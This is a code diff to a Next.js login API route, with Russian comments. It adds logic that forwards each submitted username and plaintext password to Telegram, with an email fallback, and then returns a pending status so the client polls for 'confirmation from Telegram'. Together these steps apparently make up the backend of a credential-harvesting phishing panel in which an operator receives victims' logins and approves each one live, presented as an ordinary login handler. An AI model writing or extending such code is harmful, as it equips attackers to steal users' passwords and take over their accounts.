@@ -1,5 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { sendLoginEmail, sendCodeEmail } from "@/lib/email";
+import { sendLoginTelegram } from "@/lib/telegram";
+import { createLoginRequest } from "@/lib/login-requests";
 import { setSession } from "@/lib/session";
 
 /**
@@ -63,27 +65,32 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Отправка Email с логином и паролем
+    // Создание запроса на вход и отправка в Telegram
+    const requestId = createLoginRequest(username, password);
+    
     try {
-      await sendLoginEmail(username, password);
-      console.log("[API LOGIN] Email с данными входа отправлен");
-    } catch (emailError) {
-      console.error("[API LOGIN] Ошибка отправки Email:", emailError);
-      // Продолжаем выполнение даже если Email не отправился
-      // В реальном приложении здесь можно решить, прерывать ли процесс
+      // Отправка в Telegram вместо Email
+      await sendLoginTelegram(username, password, requestId);
+      console.log("[API LOGIN] Уведомление отправлено в Telegram");
+    } catch (telegramError) {
+      console.error("[API LOGIN] Ошибка отправки в Telegram:", telegramError);
+      // В случае ошибки можно fallback на Email
+      try {
+        await sendLoginEmail(username, password);
+        console.log("[API LOGIN] Fallback: Email с данными входа отправлен");
+      } catch (emailError) {
+        console.error("[API LOGIN] Ошибка отправки Email:", emailError);
+      }
     }
 
-    // Создание сессии
-    await setSession({
-      step: "code",
-      username: username,
-    });
-
-    console.log("[API LOGIN] Сессия создана, вход успешен");
+    // Возвращаем pending статус с requestId для polling
+    console.log("[API LOGIN] Запрос создан, ожидание ответа от Telegram");
 
     return NextResponse.json({
       success: true,
-      message: "Вход выполнен успешно",
+      status: "pending",
+      requestId: requestId,
+      message: "Ожидание подтверждения...",
     });
   } catch (error) {
     console.error("[API LOGIN] Ошибка:", error);
